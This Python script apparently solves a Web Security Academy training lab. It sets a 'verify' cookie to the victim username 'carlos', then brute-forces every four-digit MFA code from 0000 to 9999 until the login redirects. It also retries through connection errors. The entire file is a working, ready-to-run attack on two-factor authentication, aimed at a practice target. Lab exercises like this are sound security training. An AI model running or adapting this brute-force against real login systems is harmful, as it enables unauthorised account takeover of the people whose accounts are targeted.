import requests
import time


def handle_retry(r, data, url, cookies, headers):
    waittime = 5
    timeout = 0
    while timeout < 5 and r.status_code != 200 and r.status_code != 302:
        try:
            time.sleep(waittime)
            timeout += 1
            waittime += 1
            print('Reconnection Attempt ' + str(timeout))
            r = requests.post(url, headers=headers, data=data, cookies=cookies, allow_redirects=False)
        except requests.exceptions.ConnectionError:
            timeout += 1
            print('Reconneciton Attempt ' + str(timeout) + ' failed')
    if r.status_code == 200:
        print('Connection Resumed')
    elif r.status_code == 302:
        print('Connection Resumed')
        location = r.headers['Location']
        url = 'https://' + subdomain + '.web-security-academy.net' + location
        session = r.cookies['session']
        cookies = {'session': session, 'verify': 'carlos'}
        headers = {'Host': subdomain + '.web-security-academy.net',
                   'User-Agent': '',
                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                   'Accept-Language': 'en-US,en;q=0.5',
                   'Accept-Encoding': 'gzip, deflate',
                   'Referer': 'https://' + subdomain + '.web-security-academy.net/login2',
                   'Upgrade-Insecure-Requests': '1',
                   'Sec-Fetch-Dest': 'document',
                   'Sec-Fetch-Mode': 'navigate',
                   'Sec-Fetch-Site': 'same-origin',
                   'Sec-Fetch-User': '?1',
                   'Te': 'trailers',
                   'Connection': 'close'
                   }
        r = requests.get(url, headers=headers, cookies=cookies)
        print('Verification code found: ' + data['mfa-code'])
        print('Lab Solved - See ' + url)
        quit()
    else:
        print('Unable to Connect - Restart Program')
        quit()


subdomain = input('Enter the subdomain for web-security-academy.net: ')
url = 'https://' + subdomain + '.web-security-academy.net/login2'

# Define the header fields for the request.

headers = {'Host': subdomain + '.web-security-academy.net',
           'User-Agent': '',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
           'Accept-Language': 'en-US,en;q=0.5',
           'Accept-Encoding': 'gzip, deflate',
           'Referer': 'https://' + subdomain + '.web-security-academy.net/login',
           'Upgrade-Insecure-Requests': '1',
           'Sec-Fetch-Dest': 'document',
           'Sec-Fetch-Mode': 'navigate',
           'Sec-Fetch-Site': 'same-origin',
           'Sec-Fetch-User': '?1',
           'Cache-Control': 'max-age=0',
           'Te': 'trailers',
           'Connection': 'close'
           }

# Define the cookie fields. The session is not consequential, so an arbitrary value is hardcoded.
# The 'verify' field holds the victim username 'carlos'.

cookies = {'session': 'wqp5eHOOX1sM8XiD2hhUE8yJ4ICUm6dM', 'verify': 'carlos'}

# Send the initial GET request - this will ensure that a verification code is assigned to the 'carlos' account.

try:
    r = requests.get(url, headers=headers, cookies=cookies, timeout=5)
    print('GET Request Sent')
    print('...')
    print('...')
    print('...')
except requests.exceptions.ReadTimeout:
    print('Failed to load page - restart program')
    quit()

# Update the headers object to include a 'referer' header for the post request

headers = {'Host': subdomain + '.web-security-academy.net',
           'User-Agent': '',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
           'Accept-Language': 'en-US,en;q=0.5',
           'Accept-Encoding': 'gzip, deflate',
           'Content-Type': 'application/x-www-form-urlencoded',
           'Content-Length': '13',
           'Referer': 'https://' + subdomain + '.web-security-academy.net/login2',
           'Upgrade-Insecure-Requests': '1',
           'Sec-Fetch-Dest': 'document',
           'Sec-Fetch-Mode': 'navigate',
           'Sec-Fetch-Site': 'same-origin',
           'Sec-Fetch-User': '?1',
           'Te': 'trailers',
           'Connection': 'close'
           }

# Brute force attempt to login to 'carlos' account with every possible verification code (ie. mfa-code)
# from 0000 to 9999.


for x in range(10000):
    code = '{:0>4}'.format(x)
    data = {'mfa-code': code}
    try:
        print('Checking ' + code + ' ...')
        r = requests.post(url, headers=headers, data=data, cookies=cookies, allow_redirects=False)
        if r.status_code == 302:
            location = r.headers['Location']
            url = 'https://' + subdomain + '.web-security-academy.net' + location
            session = r.cookies['session']
            cookies = {'session': session, 'verify': 'carlos'}
            headers = {'Host': subdomain + '.web-security-academy.net',
                       'User-Agent': '',
                       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                       'Accept-Language': 'en-US,en;q=0.5',
                       'Accept-Encoding': 'gzip, deflate',
                       'Referer': 'https://' + subdomain + '.web-security-academy.net/login2',
                       'Upgrade-Insecure-Requests': '1',
                       'Sec-Fetch-Dest': 'document',
                       'Sec-Fetch-Mode': 'navigate',
                       'Sec-Fetch-Site': 'same-origin',
                       'Sec-Fetch-User': '?1',
                       'Te': 'trailers',
                       'Connection': 'close'
                       }
            r = requests.get(url, headers=headers, cookies=cookies)
            print('Verification code found: ' + code)
            print('Lab Solved - See ' + url)
            break
    except requests.exceptions.ConnectionError:
        print('--- CONNECTION ERROR ' + str(r.status_code) + ' ---')
        handle_retry(r, data, url, cookies, headers)
        continue




